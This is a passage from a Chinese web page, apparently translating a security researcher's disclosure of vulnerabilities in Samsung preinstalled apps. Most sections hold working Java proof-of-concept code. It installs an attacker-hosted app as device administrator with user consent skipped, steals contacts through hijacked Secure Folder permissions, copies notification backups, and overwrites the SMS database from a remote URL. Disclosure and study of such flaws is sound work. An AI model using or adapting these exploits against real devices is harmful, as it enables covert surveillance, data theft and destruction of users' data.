+</code></pre> <h3 id=poc>PoC 的工作原理如下：</h3> <ol> <li>启动服务将所需文件复制到公共位置（由于这是一个无效的APK文件，安装错误后会立即删除），</li> <li>然后，<code>client_downloaded_knox_app.apk</code>读取文件。</li> </ol> <p><strong>注意：</strong>我们使用<code>MediaStore.Files</code>是因为最新的 Android 版本不允许直接读取属于其他应用程序的外部存储，但这可以使用 Android Media Content Provider 绕过。</p> <h2 id=_6>托管供应中的漏洞</h2> <p>Managed Provisioning 是所有三星设备上预装的应用程序，<strong>用于企业设备定制</strong>。</p> <p>再一次，在测试 Managed Provisioning 时，我们发现了从公共目录安装应用程序的漏洞：</p> <p><a href=https://www.ddosi.org/wp-content/uploads/2021/06/2-3.png><img alt=黑客可以利用三星预装的应用程序来监视用户 src=https://img.vjob.top/imgs/vjob_2-3.png></a> 最初的应用程序是由 AOSP 开发的，它有安全检查来验证任何交互的授权。三星修改了托管配置应用程序，以添加与其生态系统和 Knox Core 交互所需的功能。</p> <p>因此，在三星应用程序中，可以通过设置值来绕过此检查<code>com.samsung.knox.container.requestId</code>：</p> <pre><code>int intExtra = intent.getIntExtra(&quot;com.samsung.knox.container.requestId&quot;, -1);
+if (intExtra &gt; 0) {
+   ProvisionLogger.logw(&quot;Skipping verifyActionAndCaller&quot;); // the bypass
+} else if (!verifyActionAndCaller(intent, str)) {
+   return;
+}
+</code></pre> <h2 id=_7>用于安装自定义应用程序并为其授予设备管理员权限的概念证明</h2> <p>这个概念证明是通过复制<code>ProvisioningParams.Builder</code>类的代码并传递配置托管供应所需的标准参数来构建的，其中包括：</p> <ul> <li>下载应用程序的 URL</li> <li>文件的 SHA1 哈希值</li> <li>在<a href=https://developer.android.com/guide/topics/admin/device-admin#developing>设备管理接收机</a>组件名称</li> </ul> <pre><code>byte[] hash = Base64.decode(&quot;5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ&quot;, 0);
+PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder()
+       .setLocation(&quot;https://redacted.s3.amazonaws.com/app-release.apk&quot;)
+       .setPackageChecksum(hash)
+       .setSignatureChecksum(hash);
+
+ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder()
+       .setSkipUserConsent(true)
+       .setDeviceAdminComponentName(new ComponentName(&quot;test.exampleapp&quot;, &quot;test.exampleapp.MyReceiver&quot;))
+       .setDeviceAdminPackageName(&quot;test.exampleapp&quot;)
+       .setProvisioningAction(&quot;android.app.action.PROVISION_MANAGED_DEVICE&quot;)
+       .setDeviceAdminDownloadInfo(infoBuiler.build());
+
+ProvisioningParams params = builder.build();
+
+Intent i = new Intent(&quot;com.android.managedprovisioning.action.RESUME_PROVISIONING&quot;);
+i.setClassName(&quot;com.android.managedprovisioning&quot;, &quot;com.android.managedprovisioning.preprovisioning.PreProvisioningActivity&quot;);
+i.putExtra(&quot;provisioningParams&quot;, params);
+i.putExtra(&quot;com.samsung.knox.container.requestId&quot;, 1);
+i.putExtra(&quot;com.samsung.knox.container.configType&quot;, &quot;knox-do-basic&quot;);
+startActivity(i);
+</code></pre> <p>打开应用程序后，发生了以下情况：</p> <ol> <li>Managed Provisioning 被迫从攻击者指定的链接下载恶意应用程序</li> <li>步骤 1 中安装的恶意应用程序被设置为具有任意权限的设备管理员</li> <li>启动了一个过程，该过程将删除安装在同一设备上的所有其他应用程序。</li> </ol> <p>攻击看起来是这样的：</p> <video id=video controls preload=none width=100%> <source id=mp4 src=https://img.vjob.top/imgs/ddosi.com_.mp4 type=video/mp4> </video> <h2 id=_8>安全文件夹中的漏洞</h2> <p>安全文件夹是预装在三星设备上的安全文件存储应用程序。它拥有大量权限，攻击者可以通过利用在访问<a href=https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/ >任意*内容提供程序中</a>发现的漏洞来拦截这些权限：</p> <p><a href=https://www.ddosi.org/wp-content/uploads/2021/06/3-5.png><img alt=黑客可以利用三星预装的应用程序来监视用户 src=https://img.vjob.top/imgs/vjob_3-5.png></a> 一旦攻击者收到他们发送的意图，他们就能够拦截权限。</p> <p>作为 PoC，我们拦截了读/写联系人的权限：</p> <pre><code>protected void onCreate(Bundle savedInstanceState) {
+   super.onCreate(savedInstanceState);
+
+   Intent i = new Intent();
+   i.setClassName(&quot;com.samsung.knox.securefolder&quot;, &quot;com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity&quot;);
+   i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+   i.setData(ContactsContract.RawContacts.CONTENT_URI);
+   startActivityForResult(i, 0);
+}
+
+protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+   super.onActivityResult(requestCode, resultCode, data);
+
+   dump(data.getData());
+}
+
+private void dump(Uri uri) {
+   Cursor cursor = getContentResolver().query(uri, null, null, null, null);
+   if (cursor.moveToFirst()) {
+       do {
+           StringBuilder sb = new StringBuilder();
+           for (int i = 0; i &lt; cursor.getColumnCount(); i++) {
+               if (sb.length() &gt; 0) {
+                   sb.append(&quot;, &quot;);
+               }
+               sb.append(cursor.getColumnName(i) + &quot; = &quot; + cursor.getString(i));
+           }
+           Log.d(&quot;evil&quot;, sb.toString());
+       }
+       while (cursor.moveToNext());
+   }
+}
+</code></pre> <h2 id=secsettings>SecSettings 中的漏洞</h2> <p>SecSettings 是三星预装的设置应用程序。</p> <p>从 UID 1000 ( <code>system</code>)读取和写入任意文件的漏洞由两个组件组成：</p> <ul> <li>访问任意*内容提供者</li> <li>在<code>com.sec.imsservice</code>应用程序中利用不安全的 FileProvider</li> </ul> <p><a href=https://www.ddosi.org/wp-content/uploads/2021/06/4-3.png><img alt=黑客可以利用三星预装的应用程序来监视用户 src=https://img.vjob.top/imgs/vjob_4-3.png></a> 这个链是唯一可能的，因为两个应用程序都使用在它们的<code>AndroidManifest.xml</code>: 中指定的相同共享 UID <code>android:sharedUserId="android.uid.system"</code>。事实上，这个设置意味着两个不同的应用程序可以完全共享所有资源，并且可以完全访问彼此的组件。SecSettings 中的漏洞是 Google 的。它已报告给 Android VDP。奖金为2000美元。我们将在第 2 部分文章中披露此问题的详细信息。</p> <h2 id=dex-ui>三星 DeX 系统 UI 中的漏洞</h2> <p>此漏洞允许攻击者<strong>从用户通知中窃取数据</strong>，这些数据通常包括 Telegram、Google Docs 文件夹、三星电子邮件和 Gmail 收件箱的聊天描述，以及来自其他应用程序通知的信息。</p> <p>攻击者还可以激活该功能在 SD 卡上的全局可读目录中创建备份：</p> <p><a href=https://www.ddosi.org/wp-content/uploads/2021/06/5-4.png><img alt=黑客可以利用三星预装的应用程序来监视用户 src=https://img.vjob.top/imgs/vjob_5-4.png></a> 由于文件在创建备份后立即被删除，因此我们添加了创建备份副本的功能以防止这种情况发生。</p> <p>概念证明：</p> <pre><code>final File root = Environment.getExternalStorageDirectory();
+final File policyFile = new File(root, &quot;notification_policy.xml&quot;);
+final File backupCopy = new File(root, &quot;backup&quot;);
+
+Intent i = new Intent(&quot;com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION&quot;);
+i.setClassName(&quot;com.samsung.desktopsystemui&quot;, &quot;com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver&quot;);
+i.putExtra(&quot;SAVE_PATH&quot;, root.getAbsolutePath());
+i.putExtra(&quot;SESSION_KEY&quot;, &quot;not_empty&quot;);
+sendBroadcast(i);
+
+new Thread(() -&gt; {
+   while (true) {
+       if(policyFile.exists()) {
+           try {
+               InputStream i = new FileInputStream(policyFile);
+               OutputStream o = new FileOutputStream(backupCopy);
+               IOUtils.copy(i, o);
+               i.close();
+               o.close();
+           } catch (Throwable th) {
+               throw new RuntimeException(th);
+           }
+       }
+   }
+}).start();
+</code></pre> <h2 id=telephonyui>TelephonyUI 中的漏洞</h2> <p>接收器<code>com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver</code>被导出。它将文件从 中指定的 URL 保存到 中指定<code>photoring_uri</code>的路径<code>down_file</code>。这是由过度安全的 Android 扫描仪检测到的：</p> <p><a href=https://www.ddosi.org/wp-content/uploads/2021/06/6-3.png><img alt=黑客可以利用三星预装的应用程序来监视用户 src=https://img.vjob.top/imgs/vjob_6-3.png></a></p> <p>唯一的要求是服务器响应的内容类型应该是<code>image/*</code>or <code>video/*</code>。因此，我们使用文件名<code>test.mp4</code>，Amazon S3 自动指定<code>video/mp4</code>响应中的内容类型。</p> <p>概念证明：</p> <pre><code>File dbPath = new File(getPackageManager().getApplicationInfo(&quot;com.android.providers.telephony&quot;, 0).dataDir, &quot;databases/mmssms.db&quot;);
+
+Intent i = new Intent(&quot;com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING&quot;);
+i.setClassName(&quot;com.samsung.android.app.telephonyui&quot;, &quot;com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver&quot;);
+i.putExtra(&quot;photoring_uri&quot;, &quot;https://redacted.s3.amazonaws.com/test.mp4&quot;);
+i.putExtra(&quot;down_file&quot;, dbPath.getAbsolutePath());
+sendBroadcast(i);
+</code></pre> <p>结果，带有 SMS/MMS 消息的文件被攻击者控制的内容覆盖。</p> <h2 id=phototable>PhotoTable 中的漏洞</h2> <p>在 PhotoTable 中，我们发现了<a href=https://blog.oversecured.com/Android-Access-to-app-protected-components/ >Intent redirection</a>，它允许对内容提供者的访问被拦截：</p> <p><a href=https://www.ddosi.org/wp-content/uploads/2021/06/7-3.png><img alt=黑客可以利用三星预装的应用程序来监视用户 src=https://img.vjob.top/imgs/vjob_7-3.png></a> 我们利用该漏洞劫持了访问 SD 卡的权限。这是概念证明：</p> <pre><code>protected void onCreate(Bundle savedInstanceState) {
+   super.onCreate(savedInstanceState);
+   handle(getIntent());
+}
+
+protected void onNewIntent(Intent intent) {
+   super.onNewIntent(intent);
+   handle(intent);
+}
+
+private void handle(Intent intent) {
+   if(&quot;evil&quot;.equals(intent.getAction())) {
+       String uri = MediaStore.Images.Media.insertImage(getContentResolver(),
+               Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888),
+               &quot;Title_1337&quot;,
+               &quot;Description_1337&quot;);
+       Log.d(&quot;evil&quot;, &quot;Result: &quot; + uri);
+   }
+   else {
+       Intent next = new Intent(&quot;evil&quot;, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+       next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
+       next.setClass(this, getClass());
+
+       Intent i = new Intent();
+       i.setClassName(&quot;com.android.dreams.phototable&quot;, &quot;com.android.dreams.phototable.PermissionsRequestActivity&quot;);
+       i.putExtra(&quot;previous_intent&quot;, next);
+       i.putExtra(&quot;permission_list&quot;, new String[0]);
+       startActivity(i);
+   }
+}
+</code></pre> <p><a href=https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-1/ >from</a></p> <p>原文链接： <a href=https://www.ddosi.org/cve-2021-25356/ >https://www.ddosi.org/cve-2021-25356/</a></p> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=页脚> <a href=../../Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/ class="md-footer__link md-footer__link--prev" aria-label="上一页: 恢复模式" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> 恢复模式 </div> </div> </a> <a href=../../App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/ class="md-footer__link md-footer__link--next" aria-label="下一页: Android内存泄露优化总结" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> Android内存泄露优化总结 </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2022 - 3022 <span style=float:right><a href=http://beian.miit.gov.cn/ >鄂ICP备19027194号</a></span> </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.bd0b6b67.min.js"}</script> <script src=../../assets/javascripts/bundle.8aa65030.min.js></script> </body> </html>
